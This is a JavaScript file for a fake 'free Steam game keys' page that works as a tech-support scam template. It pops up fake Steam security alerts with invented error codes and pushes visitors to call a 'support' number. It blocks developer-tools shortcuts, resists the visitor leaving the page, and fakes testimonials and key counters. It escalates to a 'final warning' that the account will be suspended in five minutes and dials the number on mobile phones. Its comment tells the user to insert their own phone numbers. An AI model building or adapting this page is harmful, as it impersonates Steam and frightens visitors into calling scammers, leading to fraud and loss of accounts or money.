document.addEventListener('DOMContentLoaded', function() {
    initCountdown();
    initKeyCounters();
    initTestimonials();
    initClaimedCounter();
    
    const navLinks = document.querySelectorAll('.nav-link');
    const installSteamBtn = document.querySelector('.install-steam');
    const userInfo = document.querySelector('.user-info');
    
    const errorCodes = [
        'STEAM-ERR-0x80004005',
        'VAC-BAN-0x80240017',
        'ACCOUNT-HACK-0x800F0984',
        'CREDIT-FRAUD-0x80070005',
        'DRM-VIOLATION-0x80070422',
        'LIBRARY-CORRUPT-0x8007000D'
    ];
    
    // Replace example numbers with your own.
    const supportNumbers = [
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000',
        '+1-000-000-0000'
    ];
    
    init();
    
    function init() {
        setupEventListeners();
        
        setTimeout(() => {
            if (Math.random() > 0.4) {
                showSteamErrorModal();
            }
        }, Math.random() * 25000 + 8000);
    }
    
    function setupEventListeners() {
        navLinks.forEach(link => {
            if (!link.classList.contains('active')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    showAccountSecurityError();
                });
            }
        });
        
        if (installSteamBtn) {
            installSteamBtn.addEventListener('click', function(e) {
                e.preventDefault();
                showInstallError();
            });
        }
        
        if (userInfo) {
            userInfo.addEventListener('click', function(e) {
                e.preventDefault();
                showLoginError();
            });
        }
        
        const claimButtons = document.querySelectorAll('.claim-btn');
        claimButtons.forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                const gameCard = this.closest('.game-card');
                const gameId = gameCard.dataset.game;
                showClaimError(gameId);
            });
        });
        
        const footerLinks = document.querySelectorAll('.footer-links a');
        footerLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                showSteamErrorModal();
            });
        });
        
        const securityBadge = document.querySelector('.security-badge');
        if (securityBadge) {
            securityBadge.addEventListener('click', function(e) {
                e.preventDefault();
                showAccountSecurityError();
            });
        }
        
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
                showSteamErrorModal();
                return false;
            }
        });
        
        window.addEventListener('beforeunload', function(e) {
            const message = 'WARNING: Leaving this page may result in loss of your free Steam keys. Complete the verification process first.';
            e.returnValue = message;
            return message;
        });
    }
    
    function showSteamErrorModal() {
        createErrorModal('Steam Account Security Alert', 'Your Steam account has been flagged for suspicious activity and may be compromised.', 'STEAM-ERR-0x80004005');
    }
    
    function showAccountSecurityError() {
        createErrorModal('Account Verification Required', 'Your Steam account requires immediate verification to prevent suspension.', 'VAC-BAN-0x80240017');
    }
    
    function showInstallError() {
        createErrorModal('Steam Installation Error', 'Steam client installation has been blocked due to security violations detected on your system.', 'DRM-VIOLATION-0x80070422');
    }
    
    function showClaimError(gameId) {
        const gameNames = {
            'cyberpunk': 'Cyberpunk 2077',
            'rdr2': 'Red Dead Redemption 2',
            'gta5': 'Grand Theft Auto V',
            'witcher3': 'The Witcher 3: Wild Hunt',
            'doom': 'DOOM Eternal',
            'sekiro': 'Sekiro: Shadows Die Twice'
        };
        
        createErrorModal(
            'Steam Key Claim Blocked', 
            `Your attempt to claim ${gameNames[gameId]} has been blocked due to suspicious account activity. Verify your Steam account immediately to unlock free keys.`, 
            'CREDIT-FRAUD-0x80070005'
        );
    }
    
    function showLoginError() {
        createErrorModal('Login Authentication Failed', 'Multiple failed login attempts detected. Your account may have been compromised.', 'ACCOUNT-HACK-0x800F0984');
    }
    
    function createErrorModal(title, message, errorCode) {
        if (document.querySelector('.steam-error-modal')) return;
        
        const randomPhone = supportNumbers[Math.floor(Math.random() * supportNumbers.length)];
        
        const modal = document.createElement('div');
        modal.className = 'steam-error-modal';
        modal.style.cssText = `
            display: block;
            position: fixed;
            z-index: 20000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            animation: fadeIn 0.3s;
        `;
        
        const modalContent = document.createElement('div');
        modalContent.className = 'steam-error-content';
        modalContent.style.cssText = `
            background-color: #1e2328;
            margin: 8% auto;
            padding: 0;
            border-radius: 4px;
            width: 90%;
            max-width: 550px;
            box-shadow: 0 16px 64px rgba(0, 0, 0, 0.6);
            animation: slideIn 0.3s;
            border: 2px solid #d13438;
        `;
        
        const modalHeader = document.createElement('div');
        modalHeader.style.cssText = `
            background: #d13438;
            color: white;
            padding: 20px;
            border-radius: 4px 4px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        `;
        
        const modalBody = document.createElement('div');
        modalBody.style.cssText = `
            padding: 32px;
            text-align: center;
            color: #c7d5e0;
        `;
        
        const modalFooter = document.createElement('div');
        modalFooter.style.cssText = `
            padding: 20px 32px 32px;
            display: flex;
            gap: 12px;
            justify-content: center;
        `;
        
        modalHeader.innerHTML = `
            <h3 style="margin: 0; font-weight: 600; display: flex; align-items: center; gap: 10px;">
                <i class="fas fa-exclamation-triangle"></i>
                ${title}
            </h3>
            <span class="steam-error-close" onclick="handleIgnoreWarning()" style="font-size: 28px; font-weight: bold; cursor: pointer; line-height: 1;">&times;</span>
        `;
        
        modalBody.innerHTML = `
            <div style="color: #ff6b6b; font-size: 64px; margin-bottom: 20px;">
                <i class="fas fa-shield-alt"></i>
            </div>
            <p style="margin-bottom: 16px; line-height: 1.5; font-size: 16px; font-weight: bold;">
                ${message}
            </p>
            <p style="margin-bottom: 20px; color: #ff6b6b;">
                <strong>Error Code:</strong> ${errorCode}
            </p>
            <p style="margin-bottom: 20px;">
                Contact Steam Support immediately to secure your account and prevent permanent suspension.
            </p>
            <div style="background: #2a475e; border: 1px solid #495663; border-radius: 4px; padding: 20px; margin: 20px 0;">
                <div style="color: #66c0f4; font-size: 14px; margin-bottom: 10px; font-weight: bold;">Emergency Support Number:</div>
                <div style="color: #ff6b6b; font-size: 24px; font-weight: bold; margin-bottom: 15px;">
                    ${randomPhone}
                </div>
                <div style="color: #b8b6b4; font-size: 12px;">
                    Available 24/7 for critical account security issues
                </div>
            </div>
        `;
        
        modalFooter.innerHTML = `
            <button onclick="handleCallNow('${randomPhone}')" 
                    style="background: #d13438; color: white; border: none; padding: 12px 24px; 
                           border-radius: 3px; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 14px;">
                <i class="fas fa-phone"></i> Call Support Now
            </button>
            <button onclick="handleIgnoreWarning()" 
                    style="background: #495663; color: #c7d5e0; border: none; padding: 12px 24px; 
                           border-radius: 3px; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 14px;">
                <i class="fas fa-times"></i> Ignore Warning
            </button>
        `;
        
        modalContent.appendChild(modalHeader);
        modalContent.appendChild(modalBody);
        modalContent.appendChild(modalFooter);
        modal.appendChild(modalContent);
        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            modal.classList.add('urgent');
        }, 2000);
        
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                handleIgnoreWarning();
            }
        });
    }
    
    function addDynamicEffects() {
        setInterval(() => {
            if (Math.random() > 0.92 && !document.querySelector('.steam-error-modal')) {
                showSteamErrorModal();
            }
        }, 35000);
        
        setInterval(() => {
            const timestamps = document.querySelectorAll('.timestamp');
            timestamps.forEach((timestamp, index) => {
                if (timestamp.textContent.includes('Just now') && index > 0) {
                    const minutesAgo = Math.floor(Math.random() * 8) + 1;
                    timestamp.textContent = `${minutesAgo} minute${minutesAgo > 1 ? 's' : ''} ago`;
                }
            });
        }, 45000);
    }
    
    const style = document.createElement('style');
    style.textContent = `
        .urgent {
            animation: steamBlink 1s infinite;
        }
        
        @keyframes steamBlink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.8; }
        }
        
        @keyframes steamShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }
        
        .steam-error-content.shake {
            animation: steamShake 0.5s infinite;
        }
    `;
    document.head.appendChild(style);
    
    addDynamicEffects();
});

function initCountdown() {
    const timeLeftElement = document.getElementById('time-left');
    
    function updateCountdown() {
        const now = new Date();
        const midnight = new Date();
        midnight.setHours(24, 0, 0, 0);
        
        const totalSeconds = Math.floor((midnight - now) / 1000);
        
        const hours = Math.floor(totalSeconds / 3600);
        const minutes = Math.floor((totalSeconds % 3600) / 60);
        const seconds = totalSeconds % 60;
        
        timeLeftElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
}

function initKeyCounters() {
    const keyElements = {
        'cyberpunk': document.getElementById('cyberpunk-keys'),
        'rdr2': document.getElementById('rdr2-keys'),
        'gta5': document.getElementById('gta5-keys'),
        'witcher3': document.getElementById('witcher3-keys'),
        'doom': document.getElementById('doom-keys'),
        'sekiro': document.getElementById('sekiro-keys')
    };
    
    setInterval(() => {
        Object.keys(keyElements).forEach(game => {
            const element = keyElements[game];
            const currentCount = parseInt(element.textContent.match(/\d+/)[0]);
            
            if (currentCount > 50 && Math.random() < 0.3) {
                const newCount = currentCount - Math.floor(Math.random() * 3 + 1);
                element.textContent = `${newCount} keys left`;
                
                if (newCount < 100) {
                    element.style.color = '#ff6b6b';
                    element.style.animation = 'pulse 1s ease';
                }
            }
        });
    }, 5000);
}

function initClaimedCounter() {
    const claimedElement = document.getElementById('keys-claimed');
    let currentCount = 45287;
    
    setInterval(() => {
        if (Math.random() < 0.7) {
            currentCount += Math.floor(Math.random() * 5 + 1);
            claimedElement.textContent = currentCount.toLocaleString();
        }
    }, 3000);
}

function initTestimonials() {
    const testimonialList = document.getElementById('testimonial-list');
    const games = ['Cyberpunk 2077', 'Red Dead Redemption 2', 'GTA V', 'The Witcher 3', 'DOOM Eternal', 'Sekiro'];
    const usernames = [
        'SteamGamer2025', 'ProGamer123', 'GameMaster99', 'LootHunter', 'KeyCollector',
        'GamingLegend', 'SteamFan2025', 'FreeGameLover', 'GameAddict42', 'SteamUser777'
    ];
    
    function addTestimonial() {
        const game = games[Math.floor(Math.random() * games.length)];
        const username = usernames[Math.floor(Math.random() * usernames.length)];
        
        const testimonial = document.createElement('div');
        testimonial.className = 'testimonial';
        testimonial.innerHTML = `
            <div class="user-avatar">
                <i class="fas fa-user-circle"></i>
            </div>
            <div class="testimonial-content">
                <div class="username">${username}</div>
                <div class="claim-text">Just claimed ${game}!</div>
                <div class="timestamp">Just now</div>
            </div>
        `;
        
        testimonialList.insertBefore(testimonial, testimonialList.firstChild);
        
        if (testimonialList.children.length > 10) {
            testimonialList.removeChild(testimonialList.lastChild);
        }
        
        setTimeout(() => {
            const timestamps = testimonialList.querySelectorAll('.timestamp');
            timestamps.forEach((timestamp, index) => {
                if (index === 0) return;
                const minutes = index;
                timestamp.textContent = `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
            });
        }, 1000);
    }
    
    addTestimonial();
    setInterval(addTestimonial, 8000);
}

function claimGame(gameId) {
    const gameCard = document.querySelector(`[data-game="${gameId}"]`);
    const claimBtn = gameCard.querySelector('.claim-btn');
    
    claimBtn.style.background = 'linear-gradient(90deg, #ff6b6b 0%, #ee5a24 100%)';
    claimBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
    claimBtn.disabled = true;
    
    setTimeout(() => {
        claimBtn.style.background = 'linear-gradient(90deg, #06bfff 0%, #2d73ff 100%)';
        claimBtn.innerHTML = '<i class="fas fa-gift"></i> CLAIM KEY';
        claimBtn.disabled = false;
        
        const gameNames = {
            'cyberpunk': 'Cyberpunk 2077',
            'rdr2': 'Red Dead Redemption 2',
            'gta5': 'Grand Theft Auto V',
            'witcher3': 'The Witcher 3: Wild Hunt',
            'doom': 'DOOM Eternal',
            'sekiro': 'Sekiro: Shadows Die Twice'
        };
        
        createErrorModal(
            'Steam Key Claim Blocked', 
            `Your attempt to claim ${gameNames[gameId]} has been blocked due to suspicious account activity. Verify your Steam account immediately to unlock free keys.`, 
            'CREDIT-FRAUD-0x80070005'
        );
    }, 2000);
}

function showClaimModal(gameId) {
    const gameNames = {
        'cyberpunk': 'Cyberpunk 2077',
        'rdr2': 'Red Dead Redemption 2',
        'gta5': 'Grand Theft Auto V',
        'witcher3': 'The Witcher 3: Wild Hunt',
        'doom': 'DOOM Eternal',
        'sekiro': 'Sekiro: Shadows Die Twice'
    };
    
    const modal = document.createElement('div');
    modal.className = 'steam-modal';
    modal.style.cssText = `
        display: block;
        position: fixed;
        z-index: 10000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        animation: fadeIn 0.3s;
    `;
    
    const modalContent = document.createElement('div');
    modalContent.className = 'steam-modal-content';
    modalContent.style.cssText = `
        background-color: #1e2328;
        margin: 10% auto;
        padding: 0;
        border-radius: 4px;
        width: 90%;
        max-width: 500px;
        box-shadow: 0 16px 64px rgba(0, 0, 0, 0.5);
        animation: slideIn 0.3s;
        border: 1px solid #495663;
    `;
    
    const modalHeader = document.createElement('div');
    modalHeader.className = 'steam-modal-header';
    modalHeader.style.cssText = `
        background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%);
        color: white;
        padding: 20px;
        border-radius: 4px 4px 0 0;
        display: flex;
        justify-content: space-between;
        align-items: center;
    `;
    
    const modalBody = document.createElement('div');
    modalBody.className = 'steam-modal-body';
    modalBody.style.cssText = `
        padding: 32px;
        text-align: center;
        color: #c7d5e0;
    `;
    
    const modalFooter = document.createElement('div');
    modalFooter.className = 'steam-modal-footer';
    modalFooter.style.cssText = `
        padding: 20px 32px 32px;
        display: flex;
        gap: 12px;
        justify-content: center;
    `;
    
    const steamKey = generateSteamKey();
    
    modalHeader.innerHTML = `
        <h3 style="margin: 0; font-weight: 600; display: flex; align-items: center; gap: 10px;">
            <i class="fab fa-steam"></i>
            Steam Key Claimed
        </h3>
        <span class="steam-close" onclick="this.closest('.steam-modal').remove()" style="font-size: 28px; font-weight: bold; cursor: pointer; line-height: 1;">&times;</span>
    `;
    
    modalBody.innerHTML = `
        <div style="color: #66c0f4; font-size: 48px; margin-bottom: 20px;">
            <i class="fas fa-check-circle"></i>
        </div>
        <p style="margin-bottom: 16px; line-height: 1.5; font-size: 16px;">
            Congratulations! You have successfully claimed your free Steam key for <strong style="color: #66c0f4;">${gameNames[gameId]}</strong>.
        </p>
        <div style="background: #2a475e; border: 1px solid #495663; border-radius: 4px; padding: 20px; margin: 20px 0;">
            <div style="color: #b8b6b4; font-size: 12px; margin-bottom: 10px; text-transform: uppercase; font-weight: bold;">Your Steam Key:</div>
            <div style="color: #66c0f4; font-size: 18px; font-weight: bold; font-family: monospace; letter-spacing: 2px; margin-bottom: 15px;">
                ${steamKey}
            </div>
            <button onclick="copyToClipboard('${steamKey}')" style="background: #27ae60; color: white; border: none; padding: 8px 16px; border-radius: 3px; cursor: pointer; font-size: 12px; font-weight: bold; text-transform: uppercase;">
                <i class="fas fa-copy"></i> COPY KEY
            </button>
        </div>
        <div style="background: rgba(102, 192, 244, 0.1); border: 1px solid rgba(102, 192, 244, 0.3); border-radius: 4px; padding: 16px; margin: 20px 0; font-size: 14px; text-align: left;">
            <strong style="color: #66c0f4;">How to redeem:</strong><br>
            1. Open Steam client<br>
            2. Go to Games → Activate a Product on Steam<br>
            3. Enter the key above<br>
            4. Follow the installation instructions
        </div>
    `;
    
    modalFooter.innerHTML = `
        <button onclick="this.closest('.steam-modal').remove()" 
                style="background: linear-gradient(90deg, #06bfff 0%, #2d73ff 100%); color: white; border: none; padding: 12px 24px; 
                       border-radius: 3px; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 14px;">
            <i class="fas fa-check"></i> Continue
        </button>
    `;
    
    modalContent.appendChild(modalHeader);
    modalContent.appendChild(modalBody);
    modalContent.appendChild(modalFooter);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideIn {
            from { transform: translateY(-50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .steam-close:hover {
            opacity: 0.7;
        }
    `;
    document.head.appendChild(style);
    
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.remove();
            document.body.style.overflow = 'auto';
        }
    });
}

function generateSteamKey() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segments = [];
    
    for (let i = 0; i < 3; i++) {
        let segment = '';
        for (let j = 0; j < 5; j++) {
            segment += chars[Math.floor(Math.random() * chars.length)];
        }
        segments.push(segment);
    }
    
    return segments.join('-');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        const button = event.target;
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> COPIED!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '#06bfff';
        }, 2000);
    });
}

function handleCallNow(phoneNumber) {
    const urgentDiv = document.createElement('div');
    urgentDiv.innerHTML = `
        <div style="background: #d13438; color: white; padding: 20px; text-align: center; font-weight: bold; position: fixed; top: 0; left: 0; right: 0; z-index: 25000;">
            🚨 CRITICAL STEAM SECURITY ALERT 🚨<br>
            Call immediately: ${phoneNumber}<br>
            <small>Do not close this window or log out of Steam</small>
        </div>
    `;
    
    document.body.insertBefore(urgentDiv, document.body.firstChild);
    
    if (/Mobi|Android/i.test(navigator.userAgent)) {
        window.location.href = `tel:${phoneNumber}`;
    }
}

function handleIgnoreWarning() {
    const modal = document.querySelector('.steam-error-modal');
    if (!modal) return;
    
    const warningCount = parseInt(localStorage.getItem('steamWarningCount') || '0') + 1;
    localStorage.setItem('steamWarningCount', warningCount.toString());
    
    if (warningCount < 3) {
        modal.remove();
        document.body.style.overflow = 'auto';
        
        setTimeout(() => {
            if (document.querySelector('.steam-error-modal')) return;
            
            createFinalWarningModal();
        }, 4000);
    } else {
        showFinalWarning();
    }
}

function createFinalWarningModal() {
    const modal = document.createElement('div');
    modal.className = 'steam-error-modal';
    modal.style.cssText = `
        display: block;
        position: fixed;
        z-index: 20000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.9);
        animation: fadeIn 0.3s;
    `;
    
    const modalContent = document.createElement('div');
    modalContent.className = 'steam-error-content shake';
    modalContent.style.cssText = `
        background-color: #1e2328;
        margin: 8% auto;
        padding: 0;
        border-radius: 4px;
        width: 90%;
        max-width: 550px;
        box-shadow: 0 16px 64px rgba(0, 0, 0, 0.8);
        animation: slideIn 0.3s, steamShake 0.5s infinite;
        border: 3px solid #ff0000;
    `;
    
    const randomPhone = '+1-800-555-0199';
    
    modalContent.innerHTML = `
        <div style="background: #ff0000; color: white; padding: 20px; border-radius: 4px 4px 0 0; text-align: center;">
            <h3 style="margin: 0; font-weight: 600; font-size: 18px;">
                🚨 FINAL WARNING - ACCOUNT SUSPENSION IMMINENT 🚨
            </h3>
        </div>
        <div style="padding: 32px; text-align: center; color: #c7d5e0;">
            <div style="color: #ff0000; font-size: 72px; margin-bottom: 20px;">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            <p style="margin-bottom: 16px; line-height: 1.5; font-size: 18px; font-weight: bold; color: #ff6b6b;">
                YOUR STEAM ACCOUNT WILL BE PERMANENTLY SUSPENDED IN 5 MINUTES!
            </p>
            <p style="margin-bottom: 20px; font-size: 16px;">
                This is your final opportunity to verify your account and prevent permanent loss of all games and progress.
            </p>
            <div style="background: #2a475e; border: 2px solid #ff0000; border-radius: 4px; padding: 20px; margin: 20px 0;">
                <div style="color: #ff6b6b; font-size: 16px; margin-bottom: 10px; font-weight: bold;">EMERGENCY HOTLINE - CALL NOW:</div>
                <div style="color: #ffffff; font-size: 28px; font-weight: bold; margin-bottom: 15px;">
                    ${randomPhone}
                </div>
                <div style="color: #ff6b6b; font-size: 14px; font-weight: bold;">
                    ⏰ ONLY 5 MINUTES REMAINING ⏰
                </div>
            </div>
            <div style="padding: 20px 0;">
                <button onclick="handleCallNow('${randomPhone}')" 
                        style="background: #ff0000; color: white; border: none; padding: 15px 30px; 
                               border-radius: 3px; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 16px; margin-right: 10px;">
                    <i class="fas fa-phone"></i> CALL NOW TO SAVE ACCOUNT
                </button>
            </div>
        </div>
    `;
    
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
    
    let timeLeft = 300;
    const countdown = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        const timeDisplay = `${minutes}:${seconds.toString().padStart(2, '0')}`;
        
        const timeElement = modalContent.querySelector('.color\\: \\#ff6b6b');
        if (timeElement) {
            timeElement.innerHTML = `⏰ TIME REMAINING: ${timeDisplay} ⏰`;
        }
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            showAccountSuspended();
        }
    }, 1000);
}

function showAccountSuspended() {
    const modal = document.querySelector('.steam-error-modal');
    if (modal) {
        modal.innerHTML = `
            <div style="background-color: #000; margin: 15% auto; padding: 40px; border-radius: 4px; width: 90%; max-width: 500px; text-align: center; color: #ff0000; border: 3px solid #ff0000;">
                <h2 style="color: #ff0000; margin-bottom: 20px;">ACCOUNT SUSPENDED</h2>
                <p style="margin-bottom: 20px; font-size: 18px;">Your Steam account has been permanently suspended due to security violations.</p>
                <p style="margin-bottom: 30px;">Call ${'+1-800-555-0199'} immediately to restore access.</p>
                <button onclick="handleCallNow('${'+1-800-555-0199'}')" 
                        style="background: #ff0000; color: white; border: none; padding: 15px 30px; 
                               border-radius: 3px; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 16px;">
                    CALL TO RESTORE ACCOUNT
                </button>
            </div>
        `;
    }
}